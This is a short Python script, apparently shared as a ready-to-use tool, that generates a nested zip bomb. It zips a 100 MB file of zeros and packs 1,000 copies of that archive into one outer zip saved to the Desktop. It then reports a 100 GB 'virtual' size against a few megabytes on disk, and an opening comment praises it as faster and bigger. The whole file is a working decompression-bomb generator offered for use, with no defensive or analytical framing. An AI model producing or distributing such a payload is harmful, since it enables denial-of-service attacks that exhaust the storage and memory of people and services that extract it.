#Able to go higher limits of storage size and it is quicker


import zipfile
import os
from pathlib import Path

def create_nested_bomb():
    # 1. Setup paths
    desktop_path = Path.home() / "Desktop"
    temp_zip = desktop_path / "layer_0.zip"
    final_zip = desktop_path / "zip_bomb_nested.zip"

    print("Generating 100GB 'Virtual' Bomb...")

    # Layer 1: Create a 100MB file of zeros and zip it
    # This takes about 1 second
    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as z0:
        z0.writestr('data.txt', b'0' * (100 * 1024 * 1024))

    # Layer 2: Put 1,000 copies of that 100MB zip into a NEW zip
    # 1,000 * 100MB = 100,000MB = 100GB
    # This is instant because we are just copying the compressed bytes
    try:
        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as z1:
            for i in range(1000):
                z1.write(temp_zip, f"file_{i}.zip")
        
        # Clean up the temp file
        os.remove(temp_zip)
        
        print(f"\n--- Success ---")
        print(f"File: {final_zip}")
        print(f"Virtual Size: 100 GB")
        print(f"Actual Size on Disk: ~{os.path.getsize(final_zip) / (1024*1024):.2f} MB")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    create_nested_bomb()
